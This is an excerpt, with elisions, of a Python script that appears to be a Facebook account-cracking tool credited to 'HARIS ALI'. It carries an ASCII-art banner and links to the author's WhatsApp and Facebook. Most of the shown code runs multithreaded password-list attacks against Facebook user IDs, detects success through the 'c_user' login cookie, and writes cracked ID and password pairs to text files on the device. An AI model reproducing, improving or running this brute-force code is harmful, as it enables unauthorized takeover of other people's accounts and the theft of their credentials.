...
os.system("xdg-open https://m.facebook.com/MUHAMMAD.BILAL.TRICKER")

fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite,adsmanager')
...
▀▀███▀▀▀▀███▀  ▀███████████ ▀▀███▀▀▀▀▀   ███▌ ▀███████████ 
  ...
  ███    █▀      ███    █▀    ███    ███ █▀    ▄████████▀  
                              ███    ███                   
                                                  ...
                                                  TH4 QING OF QING H4RIS ALI                                                                                                                                                                                                                                                                                                                                                                           
                              
                                    

\033[1;37m══════════════════════════════════════════

\033[1;32m  •   \033[1;33mCREATED BY\33[0;m   :  \033[1;32HARIS ALI

\033[1;32m  •   \033[1;32mFACEBOK      : \033[93;1m HARIS ALI

\033[1;32m  •   \033[1;35mGITHUB       :  \033[1;35mHARIS  ALI  DEALING 
...
def c():
	...
	if ok =='1':
		...
		os.system("xdg-open https://wa.me/+966590383801");Main()

	if ok =='2':

		os.system("xdg-open https://www.facebook.com/H4R1S.AL1?mibextid=ZbWKwL");Main()
...
def ffc(ids,names,passlist):

        global loop,oks,cps

        sys.stdout.write('\r\r\033[1;37m [HARIS-ALI] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [HARIS ALI-OK] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        ...
                                        print('\r\r\x1b[38;5;208m [HARIS ALI-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/HARIS ALI-CP.txt', 'a').write(ids+'|'+pas+'\n')
...
def eml():
    ...
    with ThreadPool(max_workers=30) as yaari:
        ...
        for guru in user:
            ...
            yaari.submit(rcrack,ids,name,passlist)
    ...
    def api(self, uid, pwx):
        ...
        for pw in pwx:
            ...
            if "www.facebook.com" in response.json()["error_msg"]:
                ...
                print("\r \033[0;92m[HARIS ALI-OK] %s √ %s\033[0;97m         " % (uid, pw))

                self.cp.append("%s√%s" % (uid, pw))

                open("HARIS ALI-OK.txt", "a").write("  %s√%s\n" % (uid, pw))
...
def rcrack1(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if 'c_user' in log_cookies:
				...
				print('\33[1;92m-[OK] '+uid+' √ '+ps+'\33[0;97m')
				...
				print('\33[1;91m[HARIS ALI-CP] '+uid+' • '+ps+'\33[0;97m')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write(f'\r\r\033[1;37m[U•B•A•I•D] %s <•> OK:- \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m[HARIS ALI-OK] %s √ %s'%(ids,pas))
                                ...
                                if 'y' in cp:
                                        ...
                                        print(f'\r\r\033[1;37m[HARIS ALI-CP] '+ids+' • '+pas+'\033[1;97m')
